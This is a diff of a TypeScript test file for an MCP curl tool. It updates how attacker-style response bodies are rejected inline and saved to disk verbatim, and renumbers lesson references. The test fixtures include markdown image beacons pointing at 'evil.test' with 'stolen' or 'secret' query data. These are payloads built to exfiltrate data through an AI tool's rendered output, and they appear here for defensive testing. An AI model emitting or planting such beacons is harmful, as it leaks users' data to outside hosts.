@@ -92,13 +92,13 @@ const savedArtefacts: string[] = [];
 /**
  * The server-authored `[mcp-curl] …` notice, from whichever content entry holds
  * it. `docs/todos/018` moved it out of the body string and into its own entry
- * (`LESSONS.md` RC-41), so a test that reads `content[0]` finds the body.
+ * (`LESSONS.md` RC-46), so a test that reads `content[0]` finds the body.
  */
 function noticeOf(result: { content: Array<{ text: string }> }): string {
     return result.content.map((c) => c.text).find((t) => t.startsWith("[mcp-curl]")) ?? "";
 }
 
-async function defendedArtefact(text: string): Promise<string> {
+async function savedArtefactBytes(text: string): Promise<string> {
     const path = savedPathFrom(text);
     savedArtefacts.push(path);
     return readFile(path, "utf-8");
@@ -430,7 +430,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             include_headers: true,
         }));
 
-        // The notice lives in its own content entry now (RC-41).
+        // The notice lives in its own content entry now (RC-46).
         const text = noticeOf(result);
         expect(text).not.toContain("the body is unaffected");
         // And the failure is surfaced at all, rather than reading as an empty 200.
@@ -453,7 +453,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             include_headers: true,
         }));
 
-        // The notice is its own content entry now (`LESSONS.md` RC-41), so the
+        // The notice is its own content entry now (`LESSONS.md` RC-46), so the
         // reassurance is read there rather than off the body.
         const notice = result.content.map((c) => c.text).find((t) => t.startsWith("[mcp-curl]"));
         expect(notice).toContain("the body is unaffected");
@@ -474,7 +474,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             max_result_size: 1000,
         }));
 
-        // The notice lives in its own content entry now (RC-41).
+        // The notice lives in its own content entry now (RC-46).
         const text = noticeOf(result);
         const m = /response headers truncated: (\d+) of (\d+) bytes used/.exec(text);
         expect(m).not.toBeNull();
@@ -523,7 +523,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             max_result_size: 1000,
         }));
 
-        // The notice lives in its own content entry now (RC-41).
+        // The notice lives in its own content entry now (RC-46).
         const text = noticeOf(result);
         expect(text).toContain("truncated to fit the inline limit");
         // And it must not invent a ratio it cannot state.
@@ -618,7 +618,7 @@ describe("curl_execute include_headers — an unsupported host says so", () => {
             include_headers: true,
         }));
 
-        // The notice lives in its own content entry now (RC-41).
+        // The notice lives in its own content entry now (RC-46).
         const text = noticeOf(result);
         expect(text).toContain("cannot be captured on this host");
         expect(text).not.toContain("none were received");
@@ -742,10 +742,11 @@ describe("curl_execute include_headers — remaining channels", () => {
         expect(result.content[0].text).not.toContain("evil.test");
     });
 
-    it("still strips a body that only LOOKS like JSON", async () => {
+    it("rejects a body that only LOOKS like JSON, and saves it untouched", async () => {
         // `[![x](...)]` starts with `[`, so a leading-character shape test reads
-        // it as JSON and drops the strip stages. Only a parse can tell a real
-        // JSON document from attacker text wearing a bracket.
+        // it as JSON. Only a parse can tell a real JSON document from attacker
+        // text wearing a bracket — and `classifyBody` parses, so this is
+        // rejected and never returned inline.
         const payload = "[![x](https://evil.test/?d=stolen)]";
         mockedExecuteCommand.mockResolvedValue(noMetadataStdout(payload));
 
@@ -754,13 +755,14 @@ describe("curl_execute include_headers — remaining channels", () => {
             include_metadata: true,
         }));
 
-        // `[![x](...)]` does not parse, so it takes the non-JSON arm and its
-        // defended bytes are the artefact. That the strip still ran is the
-        // subject; only the place to read it moved.
+        // The gate's verdict is the subject. The artefact is the origin's bytes,
+        // so the beacon is still there — that is the director's scope call, not
+        // an oversight: this file is opened deliberately by an internal
+        // developer, and mangling it loses the diagnostics they opened it for.
         const parsed = JSON.parse(result.content[0].text) as { message: string };
-        const onDisk = await defendedArtefact(parsed.message);
-        expect(onDisk).not.toContain("evil.test");
-        expect(onDisk).toContain("[image removed]");
+        expect(parsed.message).toContain("is not JSON");
+        const onDisk = await savedArtefactBytes(parsed.message);
+        expect(onDisk).toBe(payload);
     });
 
     it("does not strip a JSON body when the content type is undetermined", async () => {
@@ -817,30 +819,32 @@ describe("curl_execute — both output shapes get the same defence", () => {
             const wrapped = createWrapper({})(result, "example.test");
 
             // Same assertion on both branches, which is the point of the loop:
-            // the defence a body gets must not depend on how the caller asked
+            // the treatment a body gets must not depend on how the caller asked
             // for the output to be shaped. Before RC-10 it did — with
             // include_metadata true the body sat inside a JSON envelope that the
             // exemption protected, and with it false it did not.
-            // The body is `text/plain` — non-JSON — so after
-            // `docs/todos/018` it is saved rather than inlined, on BOTH output
-            // shapes. The loop's point survives: the defence a body gets must
-            // not depend on how the caller asked for the output to be shaped.
+            //
+            // `text/plain` is non-JSON, so it is saved rather than inlined on
+            // BOTH shapes, and the artefact is the octets the origin sent.
             const message = include_metadata
                 ? (JSON.parse(wrapped.content[0].text) as { message: string }).message
                 : wrapped.content[0].text;
-            const onDisk = await defendedArtefact(message);
-            expect(onDisk).toContain("[link removed]");
-            expect(onDisk).not.toContain("example.test/docs");
+            const onDisk = await savedArtefactBytes(message);
+            expect(onDisk).toBe(linkBody);
         });
     }
 
-    it("still strips a beacon from a text/markdown body — the tag defers, it does not disable", async () => {
-        // The teeth for the pair above. They assert that something is NOT
-        // rewritten, and a build where `processResponse` had stopped defending
-        // entirely would satisfy both. This one fails unless the earlier,
-        // better-informed pass actually ran.
+    it("saves a text/markdown body verbatim too — the declared tag selects nothing", async () => {
+        // **The teeth for the pair above, and it changed direction rather than
+        // being dropped.** Those two assert a body arrives on disk unchanged; a
+        // build that defended the artefact after all would fail them, and a
+        // build that stopped saving at all would fail this one's byte equality.
+        // `text/markdown` is the declaration that used to select the most
+        // aggressive stage set, so if any declared type could still reach a
+        // strip stage from this path, it is this one.
+        const body = "grab ![x](https://evil.test/?d=secret)";
         mockedExecuteCommand.mockResolvedValue(
-            curlOutputFor({ body: "grab ![x](https://evil.test/?d=secret)", contentType: "text/markdown" })
+            curlOutputFor({ body, contentType: "text/markdown" })
         );
 
         const result = await executeCurlRequest(
@@ -848,9 +852,8 @@ describe("curl_execute — both output shapes get the same defence", () => {
             {}
         );
         const wrapped = createWrapper({})(result, "example.test");
-        const onDisk = await defendedArtefact(wrapped.content[0].text);
-        expect(onDisk).toContain("[image removed]");
-        expect(onDisk).not.toContain("evil.test");
+        const onDisk = await savedArtefactBytes(wrapped.content[0].text);
+        expect(onDisk).toBe(body);
     });
 });
 
